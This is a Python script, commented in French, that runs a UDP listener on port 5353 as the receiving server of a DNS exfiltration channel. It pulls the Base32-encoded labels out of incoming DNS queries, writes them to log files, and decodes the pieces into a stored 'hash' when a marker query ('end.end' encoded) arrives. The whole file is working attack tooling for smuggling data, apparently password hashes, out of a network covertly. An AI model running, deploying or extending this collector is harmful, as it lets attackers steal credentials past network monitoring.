import socket
import struct
import base64
import os
from datetime import datetime

# Dossier où seront stockés les fichiers
LOG_DIRECTORY = "dns_logs"
os.makedirs(LOG_DIRECTORY, exist_ok=True)  # Crée le dossier s'il n'existe pas

# Fichier courant (initialisé au lancement)
current_file_name = "test_routine.txt"
#current_file_name = f"{LOG_DIRECTORY}/routine_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def create_new_file():
    """Crée un nouveau fichier pour une nouvelle routine."""
    global current_file_name
    current_file_name = f"{LOG_DIRECTORY}/routine_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    print(f"New routine started. Logging to: {current_file_name}")

def append_to_file(domain_part):
    """Ajoute une partie de domaine dans le fichier courant."""
    with open(current_file_name, "a") as file:
        file.write(domain_part + ".")

def decode_file():
    """Lit, décode le contenu du fichier courant, et y ajoute le hash décodé."""
    try:
        # Lire le contenu du fichier
        with open(current_file_name, "r") as file:
            encoded_data = file.read().strip(".")  # Supprimer les points de fin
        
        # Supprimer tous les points pour obtenir une seule chaîne
        encoded_data = encoded_data.replace(".", "")

        # Ajouter du padding si nécessaire
        padding_needed = len(encoded_data) % 8
        if padding_needed:
            encoded_data += "=" * (8 - padding_needed)

        # Décoder la chaîne complète
        decoded_data = base64.b32decode(encoded_data.upper()).decode("utf-8")
        print(f"Decoded full hash: {decoded_data}")

        # Ajouter le hash décodé au fichier courant
        with open(current_file_name, "a") as file:
            file.write(f"\nDecoded hash: {decoded_data}\n")

    except Exception as e:
        print(f"Error decoding file: {e}")

def log_request(data, address):
    """Traite une requête DNS."""
    try:
        # Extraire le domaine depuis la requête DNS
        domain_name = []
        i = 12  # Les noms DNS commencent au 12e octet
        while data[i] != 0:
            length = data[i]
            i += 1
            domain_name.append(data[i:i+length].decode("utf-8"))
            i += length
        domain_name = ".".join(domain_name)

        # Vérifier si la requête est 'MVXGI.MVXGI' (Base32 de 'end.end')
        if domain_name.lower() == "mvxgi.mvxgi":
            print("End request received. Decoding the full hash...")
            decode_file()
            create_new_file()  # Démarre une nouvelle routine après le décodage
        else:
            # Ajouter la partie encodée dans le fichier
            append_to_file(domain_name)
            print(f"Appended: {domain_name}")

    except Exception as e:
        print(f"Failed to parse request: {e}")

def start_dns_server():
    """Démarre le serveur DNS."""
    server_address = ("0.0.0.0", 5353)  # Écouter sur toutes les interfaces, port 5353

    # Créer un socket UDP
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.bind(server_address)
        print(f"DNS server listening on {server_address[0]}:{server_address[1]}")

        while True:
            try:
                data, address = sock.recvfrom(512)  # Les requêtes DNS sont petites (max 512 octets)
                log_request(data, address)
            except KeyboardInterrupt:
                print("\nServer shutting down.")
                break
            except Exception as e:
                print(f"Error handling request: {e}")

if __name__ == "__main__":
    create_new_file()  # Initialise le premier fichier
    start_dns_server()
